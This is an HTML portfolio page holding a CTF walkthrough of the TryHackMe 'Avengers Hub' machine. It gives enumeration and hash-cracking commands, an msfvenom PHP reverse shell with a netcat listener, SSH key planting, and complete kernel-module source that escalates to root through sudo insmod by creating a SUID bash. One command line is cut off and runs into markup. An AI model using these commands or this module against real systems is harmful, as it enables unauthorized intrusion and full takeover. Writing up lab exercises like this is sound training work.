<!DOCTYPE html>
<html lang="fi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TryHackMe Hackfinity Battle CTF - Avengers Hub | Minni's Cybersecurity Portfolio</title>
  <meta name="description" content="Minnin kyberturvallisuuden portfolio, joka sisältää CTF-haasteita sekä eettisen hakkeroinnin ja penetraatiotestauksen projekteja. | Ethical hacking and cybersecurity portfolio by Minni, featuring CTF challenges, ethical hacking and penetration testing projects.">
  <meta name="keywords" content="Minni Wessman, kyberturvallisuus, tietoturva, kyberturvallisuuden opiskelija, penetraatiotestaaja harjoittelija, valkohattuhakkeri, eettisen hakkeroinnin harjoittelija, eettinen hakkerointi, eettinen hakkeri, penetraatiotestaus, kyberturvallisuuden työharjoittelija, hakee harjoittelupaikkaa kyberturvallisuudessa,kesätyö kyberturvallisuus, kyberturvallisuus Suomi, cybersecurity, cybersecurity student, cyber security, cybersecurity intern, cybersecurity internship, seeking cybersecurity internship, ethical hacking intern, CTF writeups, CTF write-ups, CTF walkthroughs, ethical hacker, ethical hacking, white hat hacker, penetration testing trainee, penetration testing, CTF, security, portfolio, red team, women in cybersecurity">
  
  <meta property="og:title" content="Minni's Cybersecurity Portfolio">
  <meta property="og:description" content="Cybersecurity portfolio">
  <meta property="og:url" content="https://wminni.github.io/portfolio/">
  <meta property="og:type" content="website">
  
  <style>
    @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600&display=swap');

    :root {
      --accent: #cc3a4b;
      --accent-light: #e84c5e;
      --accent-subtle: rgba(204, 58, 75, 0.15);
      --dark: #1a1a1a;
      --dark-gray: #222222;
      --medium-gray: #2a2a2a;
      --light-gray: #AAAAAA;
      --lighter-gray: #E0E0E0;
      --glow-accent: rgba(204, 58, 75, 0.5);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      scrollbar-width: thin;
      scrollbar-color: var(--accent) var(--dark);
    }

    *::-webkit-scrollbar {
      width: 8px;
    }
    *::-webkit-scrollbar-track {
      background: var(--dark);
    }
    *::-webkit-scrollbar-thumb {
      background-color: var(--accent);
      border-radius: 4px;
    }

    body {
      background-color: var(--dark);
      color: var(--light-gray);
      font-family: 'Inter', sans-serif;
      min-height: 100vh;
      line-height: 1.7;
      font-size: 16px;
      position: relative;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    
    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='400' viewBox='0 0 400 400'%3E%3Cstyle%3E.binary %7B font: 10px monospace; fill: %23cc3a4b; opacity: 0.11; %7D%3C/style%3E%3Ctext x='10' y='20' class='binary'%3E01000001 00101110 01001001 00101110%3C/text%3E%3Ctext x='10' y='40' class='binary'%3E01110011 01100101 01100011 01110101%3C/text%3E%3Ctext x='10' y='60' class='binary'%3E01110010 01101001 01110100 01111001%3C/text%3E%3Ctext x='10' y='80' class='binary'%3E01001000 01100001 01100011 01101011%3C/text%3E%3Ctext x='10' y='100' class='binary'%3E01101001 01101110 01100111 00100000%3C/text%3E%3Ctext x='10' y='120' class='binary'%3E01000101 01110100 01101000 01101001%3C/text%3E%3Ctext x='10' y='140' class='binary'%3E01100011 01100001 01101100 00100000%3C/text%3E%3Ctext x='10' y='160' class='binary'%3E01001011 01100001 01101100 01101001%3C/text%3E%3Ctext x='10' y='180' class='binary'%3E01001100 01101001 01101110 01110101%3C/text%3E%3Ctext x='10' y='200' class='binary'%3E01111000 00100000 01010110 01010000%3C/text%3E%3Ctext x='10' y='220' class='binary'%3E01001110 00100000 01010011 01100101%3C/text%3E%3Ctext x='10' y='240' class='binary'%3E01100011 01110101 01110010 01101001%3C/text%3E%3Ctext x='10' y='260' class='binary'%3E01110100 01111001 00100000 01001111%3C/text%3E%3Ctext x='10' y='280' class='binary'%3E01010011 01001001 01001110 01010100%3C/text%3E%3Ctext x='10' y='300' class='binary'%3E01010000 01100101 01101110 01110100%3C/text%3E%3Ctext x='10' y='320' class='binary'%3E01100101 01110011 01110100 01101001%3C/text%3E%3Ctext x='10' y='340' class='binary'%3E01101110 01100111 00100000 01010111%3C/text%3E%3Ctext x='10' y='360' class='binary'%3E01101001 01110010 01100101 01110011%3C/text%3E%3Ctext x='10' y='380' class='binary'%3E01101000 01100001 01110010 01101011%3C/text%3E%3C/svg%3E");
      background-repeat: repeat;
      z-index: -1;
      opacity: 0.09;
      pointer-events: none;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 2rem;
      width: 100%;
    }

    header {
      padding: 2rem 0;
      margin-bottom: 2rem;
      position: relative;
      width: 100%;
    }

    .header-content {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .logo-area {
      display: flex;
      flex-direction: column;
    }

    .name {
      font-family: 'IBM Plex Mono', monospace;
      font-size: 2.8rem;
      font-weight: 600;
      color: var(--lighter-gray);
      letter-spacing: -0.5px;
      margin-bottom: 0.5rem;
    }

    .title {
      font-family: 'IBM Plex Mono', monospace;
      font-size: 1.2rem;
      font-weight: 500;
      color: var(--accent);
      letter-spacing: 0.5px;
      text-shadow: 0 0 8px var(--glow-accent);
    }

    .subtitle {
      font-family: 'IBM Plex Mono', monospace;
      font-size: 2.2rem;
      font-weight: 600;
      color: var(--lighter-gray);
      margin-bottom: 2rem;
      text-align: center;
    }

    .subtle-accent {
      color: var(--accent);
    }

    nav {
      display: flex;
      gap: 2.5rem;
    }

    .nav-link {
      color: var(--light-gray);
      text-decoration: none;
      font-size: 1rem;
      position: relative;
      transition: color 0.3s ease;
      padding-bottom: 3px;
      font-family: 'IBM Plex Mono', monospace;
    }

    .nav-link:hover {
      color: var(--lighter-gray);
    }

    .nav-link::after {
      content: '';
      position: absolute;
      width: 0;
      height: 2px;
      bottom: 0;
      left: 0;
      background-color: var(--accent);
      transition: width 0.3s ease;
      box-shadow: 0 0 8px var(--glow-accent);
    }

    .nav-link:hover::after {
      width: 100%;
    }

    .nav-link.active {
      color: var(--lighter-gray);
    }

    .nav-link.active::after {
      width: 100%;
    }

    main {
      width: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .content-section {
      background-color: var(--dark-gray);
      padding: 2.8rem;
      border-radius: 6px;
      box-shadow: 0 3px 20px rgba(0, 0, 0, 0.25);
      position: relative;
      overflow: hidden;
      max-width: 1000px;
      width: 100%;
      margin-bottom: 2rem;
    }

    .content-section::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        radial-gradient(var(--accent-subtle) 1px, transparent 1px),
        linear-gradient(to right, var(--accent-subtle), transparent 2px);
      background-size: 20px 20px, 100% 100%;
      background-position: 0 0, 0 0;
      opacity: 0.2;
      pointer-events: none;
      z-index: 0;
    }

    .section-content {
      position: relative;
      z-index: 1;
    }

    .section-heading {
      font-family: 'IBM Plex Mono', monospace;
      font-size: 1.6rem;
      font-weight: 600;
      color: var(--lighter-gray);
      margin-bottom: 1.5rem;
      display: flex;
      align-items: center;
      letter-spacing: 0.5px;
    }

    .section-heading::before {
      content: ">";
      color: var(--accent);
      margin-right: 0.8rem;
      font-weight: 700;
      text-shadow: 0 0 8px var(--glow-accent);
    }

    .section-content p {
      margin-bottom: 1.5rem;
      padding-left: 0.5rem;
      font-size: 1.05rem;
      line-height: 1.8;
    }
    
    .section-content p:last-child {
      margin-bottom: 0;
    }

    .header-accent {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 3px;
      background: linear-gradient(to right, var(--accent), var(--accent-light), transparent);
      box-shadow: 0 0 12px var(--glow-accent);
    }

    .security-indicator {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 30px;
      height: 30px;
      border-radius: 50%;
      border: 1px solid var(--accent);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 16px;
      color: var(--accent);
      opacity: 0.5;
      z-index: 100;
      transition: opacity 0.3s ease;
      animation: subtle-pulse 4s infinite ease-in-out;
    }

    .security-indicator:hover {
      opacity: 0.8;
    }

    .writeup-text {
      color: var(--light-gray);
      font-size: 1.05rem;
      line-height: 1.8;
      margin-bottom: 1.5rem;
      text-align: justify;
    }

    .challenge-quote {
      margin: 20px 0;
      padding: 15px 20px;
      border-left: 4px solid var(--accent);
      background-color: rgba(204, 58, 75, 0.1);
      color: var(--light-gray);
      font-style: italic;
      font-size: 1.05rem;
      line-height: 1.8;
      position: relative;
    }

    .challenge-quote::before {
      content: """;
      font-size: 3rem;
      font-family: Georgia, serif;
      position: absolute;
      top: -10px;
      left: 5px;
      color: var(--accent);
      opacity: 0.4;
    }

    .writeup-text a {
      color: var(--accent);
      text-decoration: underline;
      font-weight: bold;
      transition: all 0.2s ease;
    }

    .writeup-text a:hover {
      color: var(--accent-light);
      text-shadow: 0 0 3px var(--glow-accent);
    }

    .back-button-container, .navigation-buttons {
      margin: 30px 0;
      display: flex;
      justify-content: center;
      gap: 20px;
    }

    .back-button, .next-button {
      display: inline-block;
      padding: 12px 25px;
      background-color: transparent;
      border: 2px solid var(--accent);
      border-radius: 5px;
      color: var(--accent);
      font-size: 1.1rem;
      font-weight: bold;
      text-decoration: none;
      transition: all 0.3s ease;
      letter-spacing: 1px;
      text-shadow: 0 0 2px var(--glow-accent);
    }

    .back-button:hover, .next-button:hover {
      background-color: rgba(204, 58, 75, 0.2);
      transform: translateY(-3px);
      box-shadow: 0 0 20px var(--glow-accent);
      color: var(--lighter-gray);
    }

    .image-container {
      display: flex;
      justify-content: center;
      margin: 20px 0;
      width: 100%;
    }

    .challenge-image {
      max-width: 90%;
      border: 1px solid var(--accent);
      border-radius: 5px;
      box-shadow: 0 0 10px var(--glow-accent);
    }

    .challenge-section {
      margin: 35px 0;
      padding: 25px;
      border: 1px solid var(--accent);
      border-radius: 10px;
      background-color: var(--medium-gray);
      box-shadow: 0 0 10px var(--glow-accent);
    }

    .step-title {
      font-family: 'IBM Plex Mono', monospace;
      font-size: 1.5rem;
      color: var(--lighter-gray);
      margin-bottom: 20px;
      display: flex;
      align-items: center;
    }

    .step-number {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 36px;
      height: 36px;
      background-color: var(--accent);
      box-shadow: 0 0 10px var(--glow-accent);
      color: var(--dark);
      border-radius: 50%;
      margin-right: 15px;
      font-weight: bold;
      font-size: 1.2rem;
    }

    .section-title {
      font-family: 'IBM Plex Mono', monospace;
      font-size: 1.6rem;
      font-weight: 600;
      color: var(--lighter-gray);
      margin-bottom: 1.5rem;
      display: flex;
      align-items: center;
      letter-spacing: 0.5px;
    }

    .section-title::before {
      content: ">";
      color: var(--accent);
      margin-right: 0.8rem;
      font-weight: 700;
      text-shadow: 0 0 8px var(--glow-accent);
    }

    .writeup-text code {
      background-color: rgba(204, 58, 75, 0.2);
      padding: 2px 5px;
      border-radius: 3px;
      font-family: 'IBM Plex Mono', monospace;
      font-size: 0.9em;
      color: var(--light-gray);
    }

    .process-map {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-wrap: wrap;
      margin: 30px 0;
      padding: 15px;
      background-color: var(--dark-gray);
      border: 1px dashed var(--accent);
      border-radius: 8px;
    }

    .process-step {
      padding: 10px 20px;
      background-color: rgba(204, 58, 75, 0.2);
      color: var(--light-gray);
      border: 1px solid var(--accent);
      border-radius: 5px;
      margin: 5px;
      text-align: center;
      font-weight: bold;
    }

    .process-arrow {
      color: var(--accent);
      font-size: 1.5rem;
      margin: 0 5px;
    }

    .summary-section {
      margin-top: 40px;
      padding: 25px;
      background-color: rgba(204, 58, 75, 0.1);
      border-radius: 10px;
      border-left: 5px solid var(--accent);
    }

    .summary-title {
      font-family: 'IBM Plex Mono', monospace;
      font-size: 1.5rem;
      color: var(--accent);
      margin-bottom: 20px;
      text-align: center;
    }

    .code-container {
      margin: 25px 0;
      padding: 0;
      border-radius: 8px;
      overflow: hidden;
      box-shadow: 0 0 15px var(--glow-accent);
    }
    
    .code-title {
      background-color: var(--accent);
      color: var(--dark);
      font-family: 'IBM Plex Mono', monospace;
      font-size: 1.1rem;
      padding: 10px 15px;
      margin: 0;
      border-bottom: 1px solid var(--accent-light);
      text-shadow: 0 0 2px rgba(204, 58, 75, 0.8);
    }
    
    .code-block {
      background-color: var(--dark);
      padding: 15px;
      margin: 0;
      overflow-x: auto;
      font-family: 'IBM Plex Mono', monospace;
      font-size: 0.9rem;
      line-height: 1.5;
      border-left: 3px solid var(--accent);
    }
    
    .code-block code {
      background-color: transparent;
      padding: 0;
      color: #f8f8f2;
      display: block;
      white-space: pre;
    }
    
    /* Syntax highlighting */
    .code-comment {
      color: #6a9955;
      font-style: italic;
    }
    
    .code-preprocessor {
      color: #c678dd;
    }
    
    .code-keyword {
      color: #569cd6;
      font-weight: bold;
    }
    
    .code-type {
      color: #4ec9b0;
    }
    
    .code-function {
      color: #dcdcaa;
    }
    
    .code-string {
      color: #ce9178;
    }
    
    .code-number {
      color: #b5cea8;
    }

    .letter {
      display: inline-block;
      white-space: pre;
      animation: letter-glow 4s infinite;
    }

    @keyframes pulse {
      0% {
        box-shadow: 0 0 0 0 rgba(204, 58, 75, 0.7);
      }
      70% {
        box-shadow: 0 0 0 10px rgba(204, 58, 75, 0);
      }
      100% {
        box-shadow: 0 0 0 0 rgba(204, 58, 75, 0);
      }
    }

    @keyframes subtle-pulse {
      0%, 100% {
        box-shadow: 0 0 5px rgba(204, 58, 75, 0);
      }
      50% {
        box-shadow: 0 0 10px var(--glow-accent);
      }
    }

    @keyframes letter-glow {
      0%, 100% {
        color: var(--accent);
        text-shadow: 0 0 5px var(--glow-accent), 0 0 10px rgba(204, 58, 75, 0.2);
      }
      50% {
        color: var(--accent-light);
        text-shadow: 0 0 10px rgba(204, 58, 75, 0.7), 0 0 20px rgba(204, 58, 75, 0.4), 0 0 30px rgba(204, 58, 75, 0.2);
      }
    }

    @media (max-width: 768px) {
      .container {
        width: 90%;
      }
      
      .header-content {
        flex-direction: column;
        text-align: center;
      }
      
      nav {
        margin-top: 1.5rem;
        justify-content: center;
        flex-wrap: wrap;
      }
      
      .section-title, .section-heading {
        font-size: 1.4rem;
      }
      
      .writeup-text, .challenge-quote {
        font-size: 1rem;
      }
      
      .process-map {
        flex-direction: column;
      }
      
      .process-arrow {
        transform: rotate(90deg);
        margin: 5px 0;
      }
    }
  </style>
</head>
<body>
  <canvas id="matrix-canvas"></canvas>
  
  <div class="container">
    <header>
      <div class="header-accent"></div>
      <div class="header-content">
        <div class="logo-area">
          <h1 class="name">Minni Wessman</h1>
          <div class="title">Portfolio</div>
        </div>
        <nav>
          <a href="index.html" class="nav-link">Home</a>
          <a href="about.html" class="nav-link">About</a>
          <a href="projects.html" class="nav-link active">Projects</a>
		<a href="learning.html" class="nav-link">Learning</a>
          <a href="contact.html" class="nav-link">Contact</a>
        </nav>
      </div>
    </header>

    <main>
      <section class="content-section">
        <div class="section-content">
          <h1 class="subtitle">Avengers Hub Walkthrough</h1>
          
          <div class="section-title">Red Teaming / Avengers Hub</div>

          <div class="image-container">
            <img src="images/avengershub.png" alt="Avengers Hub" class="challenge-image">
          </div>

          <blockquote class="challenge-quote">
            "Cyber Avengers' private server has been hijacked, and Cipher has locked everyone out. Your mission: retrace his steps, breach the system, escalate privileges, and reclaim control. The server is yours—root it, secure it, and shut Cipher out for good."
          </blockquote>
          <p class="writeup-text">
            In this challenge, two flags had to be found – a user flag and a root flag.
          </p>
          
          <div class="process-map">
            <div class="process-step">1. Reconnaissance</div>
            <div class="process-arrow">→</div>
            <div class="process-step">2. Initial Access</div>
            <div class="process-arrow">→</div>
            <div class="process-step">3. Privilege Escalation</div>
            <div class="process-arrow">→</div>
            <div class="process-step">4. Flag Capture</div>
          </div>

          <!-- Vaihe 1: Initial Reconnaissance -->
          <div class="challenge-section">
            <h3 class="step-title"><span class="step-number">1</span> Initial Reconnaissance</h3>
            
            <p class="writeup-text">
              I accessed the target machine's IP address through a web browser. Upon connecting, I encountered a page displaying a "Website Under Construction" message. While this seemed like an inactive page, the server could still contain valuable files or directories for enumeration.
            </p>
            
            <div class="image-container">
              <img src="images/avengershub1.png" alt="Website Under Construction" class="challenge-image">
            </div>
          </div>

          <!-- Vaihe 2: Port Scanning -->
          <div class="challenge-section">
            <h3 class="step-title"><span class="step-number">2</span> Port Scanning</h3>
            
            <p class="writeup-text">
              To gather more information about the target machine, I performed a service version scan using the Nmap tool with the command:
              <br><code>nmap -sV 10.10.237.26</code>
              <br><br>
              This scan revealed that two ports were open: port 22 (SSH) and port 80 (HTTP). The open HTTP port indicated that Apache HTTPD was running, which might be vulnerable to certain attacks.
            </p>
            
            <div class="image-container">
              <img src="images/avengershub2.png" alt="Nmap Scan Results" class="challenge-image">
            </div>
          </div>

          <!-- Vaihe 3: Directory Enumeration -->
          <div class="challenge-section">
            <h3 class="step-title"><span class="step-number">3</span> Directory Enumeration</h3>
            
            <p class="writeup-text">
              Next, I used <strong>Gobuster</strong> for directory enumeration by running the following command:
              <br><code>gobuster dir -u http://10.10.237.26 -w /usr/share/wordlists/dirb/common.txt</code>
              <br><br>
              I discovered the /backups directory, which contained an important file, <strong>breakglass.zip</strong>. I found that this file was password-protected.
            </p>
            
            <div class="image-container">
              <img src="images/avengershub3.png" alt="Gobuster Results" class="challenge-image">
            </div>
          </div>

          <!-- Vaihe 4: Password Cracking -->
          <div class="challenge-section">
            <h3 class="step-title"><span class="step-number">4</span> Password Cracking</h3>
            
            <p class="writeup-text">
              I proceeded to download the <strong>breakglass.zip</strong> file using wget and extracted it with the unzip command. Inside the archive, I found a file called <strong>recovery.txt</strong>, which contained an MD5 hash of the admin user's password.
              <br><br>
              To crack the hash, I used the <strong>zip2john</strong> and <strong>John the Ripper</strong> tools:
              <br><code>zip2john breakglass.zip > ziphash.txt</code>
              <br><code>john --wordlist=/usr/share/wordlists<!-- Vaihe 4: Password Cracking (jatkoa) -->
            <div class="image-container">
              <img src="images/avengershub4.png" alt="Zip File Download" class="challenge-image">
            </div>
            
            <div class="image-container">
              <img src="images/avengershub5.png" alt="Zip File Password Cracking" class="challenge-image">
            </div>
          </div>

          <!-- Vaihe 5: CMS Access -->
          <div class="challenge-section">
            <h3 class="step-title"><span class="step-number">5</span> CMS Access</h3>
            
            <p class="writeup-text">
              I logged into the WBCE CMS using the admin credentials (admin : securepassword), which gave me access to the website's administration panel.
            </p>
            
            <div class="image-container">
              <img src="images/avengershub6.png" alt="WBCE CMS Login" class="challenge-image">
            </div>
          </div>

          <!-- Vaihe 6: Reverse Shell Creation -->
          <div class="challenge-section">
            <h3 class="step-title"><span class="step-number">6</span> Reverse Shell Creation</h3>
            
            <p class="writeup-text">
              I used <strong>msfvenom</strong> to create a reverse shell PHP payload with the following command:
              <br><code>msfvenom -p php/reverse_php LHOST=10.10.43.8 LPORT=4444 -f raw > shell.inc</code>
              <br><br>
              Then, I uploaded the <strong>shell.inc</strong> file to the <strong>Media</strong> directory within the CMS. After uploading the reverse shell, I set up a listener on my attacker machine to catch the incoming shell connection using <strong>Netcat</strong>.
              <br><br>
              I ran the command:
              <br><code>nc -lvnp 4444</code>
              <br><br>
              This allowed me to establish a reverse shell connection with the target machine.
            </p>
            
            <div class="image-container">
              <img src="images/avengershub7.png" alt="Reverse Shell Creation" class="challenge-image">
            </div>
            
            <div class="image-container">
              <img src="images/avengershub8.png" alt="Reverse Shell Upload" class="challenge-image">
            </div>
          </div>

          <!-- Vaihe 7: SSH Key Authentication -->
          <div class="challenge-section">
            <h3 class="step-title"><span class="step-number">7</span> SSH Key Authentication</h3>
            
            <p class="writeup-text">
              Next, I generated an <strong>SSH key pair</strong> to enable SSH access to the target machine.
              <br><br>
              The command I used was:
              <br><code>ssh-keygen -t rsa -b 4096 -f mykey</code>
              <br><br>
              Afterward, I added the public key to the <strong>/home/void/.ssh/authorized_keys</strong> file on the target machine, allowing me to log in as the <strong>void</strong> user via SSH.
              <br><br>
              I successfully logged into the target machine as the <strong>void</strong> user via SSH using the following command:
              <br><code>ssh -i mykey void@10.10.237.26</code>
              <br><br>
              Once logged in, I accessed the <strong>user.txt</strong> flag, confirming that I had successfully compromised the user account.
            </p>
            
            <div class="image-container">
              <img src="images/avengershub9.png" alt="SSH Key Generation" class="challenge-image">
            </div>
            
            <div class="image-container">
              <img src="images/avengershub11.png" alt="SSH Access" class="challenge-image">
            </div>
          </div>

<!-- Vaihe 8: Privilege Escalation Opportunity -->
<div class="challenge-section">
  <h3 class="step-title"><span class="step-number">8</span> Privilege Escalation Opportunity</h3>
  
 <p class="writeup-text">
  Upon running the command <code>sudo -l</code>, I discovered that the <strong>void</strong> user could run the command <code>/sbin/insmod</code> without needing a password. This was a key opportunity for privilege escalation.
  <br><br>
  I created the <strong>cyberavengers.c</strong> kernel module, which creates a <strong>SUID binary</strong>. This binary copies the <code>/bin/bash</code> executable to the <code>/tmp/rootbash</code> path and sets the SUID bit to give it root privileges.
  <br><br>
  After creating the module, I created a Makefile and compiled the module with make.
  <br><br>
  Due to my attackbox crashing, I restarted it and re-ran the necessary steps to continue. As a result, some of the later screenshots and commands show different IP addresses, since the machine was assigned a new one after reboot.
</p>

  
  <div class="image-container">
    <img src="images/avengershub10.png" alt="Privilege Escalation" class="challenge-image">
  </div>
  
  <div class="code-container">
  <h4 class="code-title" style="color: black;">cyberavengers.c - Kernel Module for Privilege Escalation</h4>
  <pre class="code-block"><code><span class="code-comment"># cyberavengers.c - Kernel module for privilege escalation in CTF
# 
# This module creates a SUID copy of /bin/bash for privilege escalation
# in a controlled CTF environment. It demonstrates how kernel modules
# can be used to gain elevated privileges when the insmod command
# is allowed to be executed with sudo.</span>

<span class="code-preprocessor">#include &lt;linux/module.h&gt;</span>
<span class="code-preprocessor">#include &lt;linux/kernel.h&gt;</span>
<span class="code-preprocessor">#include &lt;linux/init.h&gt;</span>
<span class="code-preprocessor">#include &lt;linux/kthread.h&gt;</span>
<span class="code-preprocessor">#include &lt;linux/delay.h&gt;</span>

<span class="code-comment"># Thread function that creates a SUID root bash binary
# by copying /bin/bash to /tmp/rootbash and setting SUID permission</span>
<span class="code-keyword">static</span> <span class="code-type">int</span> <span class="code-function">reverse_shell_thread</span>(<span class="code-type">void</span> *data)
{
    <span class="code-type">char</span> *argv[] = { 
        <span class="code-string">"/bin/bash"</span>, 
        <span class="code-string">"-c"</span>,
        <span class="code-string">"cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash"</span>, 
        <span class="code-keyword">NULL</span> 
    };
    <span class="code-type">char</span> *envp[] = { 
        <span class="code-string">"PATH=/usr/bin:/bin"</span>, 
        <span class="code-keyword">NULL</span> 
    };
    
    <span class="code-comment"># Execute the command with elevated privileges</span>
    call_usermodehelper(argv[<span class="code-number">0</span>], argv, envp, UMH_WAIT_EXEC);
    <span class="code-keyword">return</span> <span class="code-number">0</span>;
}

<span class="code-comment"># Module initialization function
# Creates and runs the thread that handles privilege escalation</span>
<span class="code-keyword">static</span> <span class="code-type">int</span> <span class="code-keyword">__init</span> <span class="code-function">rev_init</span>(<span class="code-type">void</span>)
{
    printk(KERN_INFO <span class="code-string">"Privilege escalation module loaded\n"</span>);
    kthread_run(reverse_shell_thread, <span class="code-keyword">NULL</span>, <span class="code-string">"rev_shell"</span>);
    <span class="code-keyword">return</span> <span class="code-number">0</span>;
}

<span class="code-comment"># Module cleanup function</span>
<span class="code-keyword">static</span> <span class="code-type">void</span> <span class="code-keyword">__exit</span> <span class="code-function">rev_exit</span>(<span class="code-type">void</span>)
{
    printk(KERN_INFO <span class="code-string">"Privilege escalation module unloaded\n"</span>);
}

<span class="code-comment"># Register module functions</span>
module_init(rev_init);
module_exit(rev_exit);

<span class="code-comment"># Module metadata</span>
MODULE_LICENSE(<span class="code-string">"GPL"</span>);
MODULE_AUTHOR(<span class="code-string">"CTF Participant"</span>);
MODULE_DESCRIPTION(<span class="code-string">"CTF demonstration kernel module for privilege escalation"</span>);</code></pre>
</div>
<div class="code-container">
  <h4 class="code-title" style="color: black;">Makefile - Build Configuration for Kernel Module</h4>
  <pre class="code-block"><code><span class="code-comment"># Specify the kernel module object file to build</span>
<span class="code-keyword">obj-m</span> += <span class="code-string">cyberavengers.o</span>

<span class="code-comment"># Default build rule - builds the kernel module against current kernel headers</span>
<span class="code-keyword">all:</span>
	<span class="code-function">make</span> -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

<span class="code-comment"># Clean rule - removes all generated files</span>
<span class="code-keyword">clean:</span>
	<span class="code-function">make</span> -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean</code></pre>
</div>
</div>

      <!-- Vaihe 9: Root Access -->
      <div class="challenge-section">
        <h3 class="step-title"><span class="step-number">9</span> Root Access</h3>
        
        <p class="writeup-text">
          Once I had successfully compiled the module, I uploaded it to the target machine using:
          <br><code>sudo /sbin/insmod cyberavengers.ko</code>
          <br><br>
          I verified that the <strong>/tmp/rootbash</strong> binary was created and had the correct permissions to be executed as root.
          <br><br>
          I ran the SUID binary with the command:
          <br><code>/tmp/rootbash -p</code>
          <br><br>
          This gave me root privileges. I confirmed that I had root access by running the id command, which displayed that I was logged in as the root user.
        </p>
        
        <div class="image-container">
          <img src="images/avengershub12.png" alt="Root Access" class="challenge-image">
        </div>
      </div>

      <!-- Flag Capture -->
      <div class="challenge-section">
        <h3 class="step-title"><span class="step-number">✓</span> Flag Capture</h3>
        
        <p class="writeup-text">
          Finally, I found the root flag from <strong>/root/root.txt</strong> by running the following command:
          <br><code>cat /root/root.txt</code>
        </p>
        
        <div class="image-container">
          <img src="images/avengershub13.png" alt="Root Flag" class="challenge-image">
        </div>
      </div>

      <div class="summary-section">
        <h3 class="summary-title">Challenge Summary</h3>
        
        <div class="summary-content">
          <p class="writeup-text">
            <strong>Overview:</strong> The Cyber Avengers' private server had been hijacked by an attacker named Cipher, who locked out legitimate users and left a malicious web shell behind. My mission was to retrace his steps, gain access to the compromised system, escalate privileges, and ultimately reclaim control by obtaining root access.
          </p>
          
          <p class="writeup-text">
            <strong>What I learned:</strong> I encountered several challenges while working on this task, but it was the most educational and enjoyable challenge for me in this CTF. This provided solid hands-on practice and let me explore how these tools work together as part of a complete process.
          </p>
        </div>
      </div>

      <div class="navigation-buttons">
        <a href="hackfinity-ctf.html" class="back-button">Back to CTF Challenges</a>
      </div>
